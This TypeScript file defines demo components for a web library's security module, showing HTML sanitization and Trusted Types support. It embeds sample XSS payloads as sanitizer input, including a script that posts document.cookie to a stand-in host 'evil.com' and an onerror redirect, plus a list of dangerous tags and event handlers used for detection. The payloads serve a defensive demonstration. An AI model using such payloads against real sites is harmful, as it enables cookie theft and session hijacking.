/**
 * Security Module Demos
 * Demonstrates HTML sanitization and Trusted Types
 */

import { component, escapeHtml, html, isTrustedTypesSupported, sanitize } from 'bquery';

// Default dangerous HTML examples
const DANGEROUS_HTML_EXAMPLES = `<img src=x onerror="alert('XSS')">
<script>alert('bad')</script>
<div onclick="evil()">Click me</div>
<a href="javascript:alert(1)">Malicious Link</a>
<p>Safe paragraph</p>
<b>Bold text</b>
<style>body { display: none; }</style>`;

// Sanitize Demo Component
component('demo-sanitize', {
  styles: `
    :host { display: block; }

    .controls {
      display: flex;
      gap: 0.5rem;
      margin-bottom: 1rem;
      flex-wrap: wrap;
    }

    .btn {
      padding: 0.5rem 1rem;
      font-size: 0.75rem;
      font-family: inherit;
      border: 1px solid #27272a;
      border-radius: 0.375rem;
      background: #18181b;
      color: #fafafa;
      cursor: pointer;
      transition: all 0.15s ease;
    }

    .btn:hover {
      background: #27272a;
      border-color: #3f3f46;
    }

    .btn.active {
      background: #6366f1;
      border-color: #6366f1;
    }

    .split {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 1rem;
    }

    @media (max-width: 768px) {
      .split { grid-template-columns: 1fr; }
    }

    .panel { display: flex; flex-direction: column; gap: 0.75rem; }

    .panel-title {
      font-weight: 500;
      color: #a1a1aa;
      font-size: 0.875rem;
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }

    .panel-title.danger { color: #ef4444; }
    .panel-title.safe { color: #22c55e; }

    .icon { font-size: 1rem; }

    textarea {
      width: 100%;
      min-height: 140px;
      padding: 0.75rem;
      font-family: 'JetBrains Mono', monospace;
      font-size: 0.75rem;
      background: #0a0a0b;
      border: 1px solid #27272a;
      border-radius: 0.5rem;
      color: #fafafa;
      resize: vertical;
      outline: none;
      line-height: 1.5;
    }

    textarea:focus {
      border-color: #6366f1;
      box-shadow: 0 0 0 2px rgba(99, 102, 241, 0.2);
    }

    .output {
      min-height: 140px;
      padding: 0.75rem;
      background: rgba(34, 197, 94, 0.05);
      border: 1px solid rgba(34, 197, 94, 0.2);
      border-radius: 0.5rem;
      overflow: auto;
    }

    .output pre {
      margin: 0;
      font-family: 'JetBrains Mono', monospace;
      font-size: 0.75rem;
      white-space: pre-wrap;
      word-break: break-all;
      color: #86efac;
      line-height: 1.5;
    }

    .stats {
      display: flex;
      gap: 1rem;
      padding: 0.75rem;
      background: #18181b;
      border: 1px solid #27272a;
      border-radius: 0.5rem;
      margin-top: 1rem;
      flex-wrap: wrap;
    }

    .stat {
      display: flex;
      flex-direction: column;
      gap: 0.25rem;
    }

    .stat-label {
      font-size: 0.625rem;
      color: #71717a;
      text-transform: uppercase;
      letter-spacing: 0.05em;
    }

    .stat-value {
      font-family: 'JetBrains Mono', monospace;
      font-size: 0.875rem;
      font-weight: 600;
    }

    .stat-value.danger { color: #ef4444; }
    .stat-value.safe { color: #22c55e; }
    .stat-value.neutral { color: #a1a1aa; }

    .diff {
      margin-top: 1rem;
    }

    .diff-title {
      font-size: 0.75rem;
      color: #71717a;
      margin-bottom: 0.5rem;
    }

    .diff-list {
      display: flex;
      flex-wrap: wrap;
      gap: 0.375rem;
    }

    .diff-tag {
      font-family: 'JetBrains Mono', monospace;
      font-size: 0.625rem;
      padding: 0.25rem 0.5rem;
      border-radius: 0.25rem;
      background: rgba(239, 68, 68, 0.15);
      color: #fca5a5;
      border: 1px solid rgba(239, 68, 68, 0.3);
    }

    .diff-attr {
      font-family: 'JetBrains Mono', monospace;
      font-size: 0.625rem;
      padding: 0.25rem 0.5rem;
      border-radius: 0.25rem;
      background: rgba(245, 158, 11, 0.15);
      color: #fcd34d;
      border: 1px solid rgba(245, 158, 11, 0.3);
    }
  `,
  render() {
    return html`
      <div class="controls">
        <button class="btn" id="btn-reset">↺ Reset</button>
        <button class="btn" id="btn-xss">+ XSS Attack</button>
        <button class="btn" id="btn-script">+ Script Tag</button>
        <button class="btn" id="btn-style">+ Style Injection</button>
      </div>

      <div class="split">
        <div class="panel">
          <div class="panel-title danger"><span class="icon">⚠️</span> Dangerous Input</div>
          <textarea id="dangerous-input"></textarea>
        </div>
        <div class="panel">
          <div class="panel-title safe"><span class="icon">✓</span> Sanitized Output</div>
          <div class="output">
            <pre id="sanitized-output"></pre>
          </div>
        </div>
      </div>

      <div class="stats">
        <div class="stat">
          <span class="stat-label">Input Length</span>
          <span class="stat-value neutral" id="stat-input">0</span>
        </div>
        <div class="stat">
          <span class="stat-label">Output Length</span>
          <span class="stat-value safe" id="stat-output">0</span>
        </div>
        <div class="stat">
          <span class="stat-label">Removed</span>
          <span class="stat-value danger" id="stat-removed">0 chars</span>
        </div>
      </div>

      <div class="diff" id="diff-section" style="display: none;">
        <div class="diff-title">Removed Elements & Attributes:</div>
        <div class="diff-list" id="diff-list"></div>
      </div>
    `;
  },
  connected() {
    queueMicrotask(() => {
      const shadow = (this as unknown as HTMLElement).shadowRoot!;
      const input = shadow.getElementById('dangerous-input') as HTMLTextAreaElement;
      const output = shadow.getElementById('sanitized-output')!;
      const statInput = shadow.getElementById('stat-input')!;
      const statOutput = shadow.getElementById('stat-output')!;
      const statRemoved = shadow.getElementById('stat-removed')!;
      const diffSection = shadow.getElementById('diff-section')!;
      const diffList = shadow.getElementById('diff-list')!;

      // Helper to detect removed elements/attributes
      const detectRemovals = (
        rawHtml: string,
        cleanHtml: string
      ): { tags: string[]; attrs: string[] } => {
        const tags: string[] = [];
        const attrs: string[] = [];

        // Detect removed tags
        const dangerousTags = ['script', 'style', 'iframe', 'object', 'embed', 'link'];
        for (const tag of dangerousTags) {
          const regex = new RegExp('<' + tag + '[\\s>]', 'gi');
          if (regex.test(rawHtml) && !regex.test(cleanHtml)) {
            tags.push('<' + tag + '>');
          }
        }

        // Detect event handlers
        const eventHandlers = rawHtml.match(/on\w+\s*=/gi) || [];
        for (const handler of eventHandlers) {
          const attrName = handler.replace('=', '').trim();
          if (!attrs.includes(attrName)) {
            attrs.push(attrName);
          }
        }

        // Detect javascript: URLs
        if (/href\s*=\s*["']?javascript:/gi.test(rawHtml)) {
          attrs.push('href="javascript:..."');
        }

        return { tags, attrs };
      };

      const updateOutput = () => {
        const raw = input.value;
        const clean = sanitize(raw);

        output.textContent = clean;
        statInput.textContent = String(raw.length);
        statOutput.textContent = String(clean.length);

        const removed = raw.length - clean.length;
        statRemoved.textContent = removed > 0 ? '-' + removed + ' chars' : '0 chars';

        // Show diff info
        const removals = detectRemovals(raw, clean);
        const hasRemovals = removals.tags.length > 0 || removals.attrs.length > 0;

        diffSection.style.display = hasRemovals ? 'block' : 'none';
        diffList.innerHTML = '';

        for (const tag of removals.tags) {
          const span = document.createElement('span');
          span.className = 'diff-tag';
          span.textContent = tag;
          diffList.appendChild(span);
        }

        for (const attr of removals.attrs) {
          const span = document.createElement('span');
          span.className = 'diff-attr';
          span.textContent = attr;
          diffList.appendChild(span);
        }
      };

      // Set initial value
      input.value = DANGEROUS_HTML_EXAMPLES;

      // Event listeners
      input.addEventListener('input', updateOutput);

      // Control buttons
      shadow.getElementById('btn-reset')?.addEventListener('click', () => {
        input.value = DANGEROUS_HTML_EXAMPLES;
        updateOutput();
      });

      shadow.getElementById('btn-xss')?.addEventListener('click', () => {
        input.value += '\n<img src=x onerror="document.location=\'evil.com\'"/>';
        updateOutput();
      });

      shadow.getElementById('btn-script')?.addEventListener('click', () => {
        input.value += '\n<script>fetch("evil.com", {method:"POST",body:document.cookie})</script>';
        updateOutput();
      });

      shadow.getElementById('btn-style')?.addEventListener('click', () => {
        input.value +=
          '\n<style>* { visibility: hidden; } .overlay { visibility: visible; position: fixed; inset: 0; }</style>';
        updateOutput();
      });

      // Initial render
      updateOutput();
    });
  },
});

// Trusted Types Demo Component
component('demo-trusted', {
  styles: `
    :host { display: block; }

    .status {
      display: flex;
      align-items: center;
      gap: 0.75rem;
      padding: 1rem 1.25rem;
      background: #18181b;
      border: 1px solid #27272a;
      border-radius: 0.75rem;
      margin-bottom: 1rem;
    }

    .status.supported {
      background: rgba(34, 197, 94, 0.1);
      border-color: rgba(34, 197, 94, 0.3);
    }

    .status.unsupported {
      background: rgba(245, 158, 11, 0.1);
      border-color: rgba(245, 158, 11, 0.3);
    }

    .status-icon {
      width: 36px;
      height: 36px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 50%;
      font-size: 1.25rem;
      flex-shrink: 0;
    }

    .supported .status-icon {
      background: rgba(34, 197, 94, 0.15);
    }

    .unsupported .status-icon {
      background: rgba(245, 158, 11, 0.15);
    }

    .status-text {
      flex: 1;
    }

    .status-text .title {
      font-weight: 600;
      margin-bottom: 0.125rem;
    }

    .supported .status-text .title { color: #22c55e; }
    .unsupported .status-text .title { color: #f59e0b; }

    .status-text .desc {
      font-size: 0.8125rem;
      color: #a1a1aa;
      line-height: 1.4;
    }

    .examples {
      display: flex;
      flex-direction: column;
      gap: 0.75rem;
    }

    .example {
      background: #0a0a0b;
      border: 1px solid #1f1f23;
      border-radius: 0.5rem;
      padding: 0.75rem;
    }

    .example-label {
      font-size: 0.625rem;
      color: #71717a;
      text-transform: uppercase;
      letter-spacing: 0.05em;
      margin-bottom: 0.375rem;
    }

    .example code {
      font-family: 'JetBrains Mono', monospace;
      font-size: 0.75rem;
      color: #a78bfa;
      display: block;
      line-height: 1.5;
    }

    .example .result {
      margin-top: 0.5rem;
      padding-top: 0.5rem;
      border-top: 1px solid #27272a;
      font-family: 'JetBrains Mono', monospace;
      font-size: 0.75rem;
      color: #86efac;
    }

    .feature-list {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
      gap: 0.5rem;
      margin-top: 0.75rem;
    }

    .feature {
      display: flex;
      align-items: center;
      gap: 0.375rem;
      font-size: 0.75rem;
      color: #a1a1aa;
    }

    .feature-icon {
      font-size: 0.875rem;
    }

    .feature.active { color: #22c55e; }
    .feature.inactive { color: #71717a; }
  `,
  render() {
    const supported = isTrustedTypesSupported();
    const statusClass = supported ? 'supported' : 'unsupported';
    const icon = supported ? '🔒' : '⚠️';
    const title = supported ? 'Trusted Types Supported' : 'Trusted Types Not Available';
    const desc = supported
      ? 'This browser enforces Trusted Types for DOM XSS prevention'
      : 'Using fallback sanitization for XSS protection';

    const escapedExample = escapeHtml('<b>bold</b>');
    const scriptEscaped = escapeHtml('<script>alert(1)</script>');

    return html`
      <div class="status ${statusClass}">
        <div class="status-icon">${icon}</div>
        <div class="status-text">
          <div class="title">${title}</div>
          <div class="desc">${desc}</div>
        </div>
      </div>

      <div class="examples">
        <div class="example">
          <div class="example-label">escapeHtml()</div>
          <code>escapeHtml('&lt;b&gt;bold&lt;/b&gt;')</code>
          <div class="result">→ "${escapedExample}"</div>
        </div>

        <div class="example">
          <div class="example-label">XSS Prevention</div>
          <code>escapeHtml('&lt;script&gt;alert(1)&lt;/script&gt;')</code>
          <div class="result">→ "${scriptEscaped}"</div>
        </div>
      </div>

      <div class="feature-list">
        <div class="feature ${supported ? 'active' : 'inactive'}">
          <span class="feature-icon">${supported ? '✓' : '○'}</span>
          <span>Trusted Types</span>
        </div>
        <div class="feature active">
          <span class="feature-icon">✓</span>
          <span>HTML Sanitization</span>
        </div>
        <div class="feature active">
          <span class="feature-icon">✓</span>
          <span>XSS Protection</span>
        </div>
        <div class="feature active">
          <span class="feature-icon">✓</span>
          <span>Event Handler Removal</span>
        </div>
      </div>
    `;
  },
});
